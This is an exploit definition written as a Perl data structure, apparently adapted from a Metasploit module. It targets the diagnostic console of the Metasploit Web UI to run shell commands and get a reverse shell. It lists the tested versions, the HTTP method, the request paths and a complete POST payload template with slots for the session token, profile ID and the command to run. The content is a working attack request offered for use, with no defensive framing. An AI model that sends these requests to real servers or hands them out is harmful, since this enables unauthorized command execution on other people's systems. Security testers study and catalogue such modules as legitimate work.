my $EXPLOIT = {
  DESCRIPTION => "

        This module exploits the \"diagnostic console\" feature in the Metasploit

        Web UI to obtain a reverse shell.



        The diagnostic console is able to be enabled or disabled by an

        administrator on Metasploit Pro and by an authenticated user on

        Metasploit Express and Metasploit Community. When enabled, the

        diagnostic console provides access to msfconsole via the web interface.

        An authenticated user can then use the console to execute shell

        commands.



        NOTE: Valid credentials are required for this module.



        Tested against:



        Metasploit Community 4.1.0,

        Metasploit Community 4.8.2,

        Metasploit Community 4.12.0

      ",
  METHOD      => "POST",
  MSF_MODULE  => "metasploit_webui_console_command_execution",
  PATH        => "settings/update_profile?",
  PATHS       => [
                   "login",
                   "user_sessions",
                   "settings",
                   "settings/update_profile",
                   "",
                 ],
  PAYLOAD     => "utf8=\\xE2\\x9C\\x93&_method=patch&authenticity_token=__AUTHENTICITY_TOKEN__&profile_id=__PROFILE_ID__&allow_console_access=__ALLOW_CONSOLE_ACCESS__&commit=UpdateSettings&read=yes&cmd=__CMD__&authenticity_token=__AUTHENTICITY_TOKEN__&last_event=0&_=&",
  TITLE       => "Metasploit Web UI Diagnostic Console Command Execution",
  VARIABLES => {
    'ALLOW_CONSOLE_ACCESS' =>       { DESCRIPTION => "", VALUE => "" },
    'PROFILE_ID' =>       { DESCRIPTION => "", VALUE => "" },
    'USER_SESSION[USERNAME]' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'USER_SESSION[PASSWORD]' =>       { DESCRIPTION => "", VALUE => "" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'AUTHENTICITY_TOKEN' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "Metasploit Web UI base path", VALUE => "/" },
    'CMD' =>       { DESCRIPTION => "", VALUE => "" },
  },
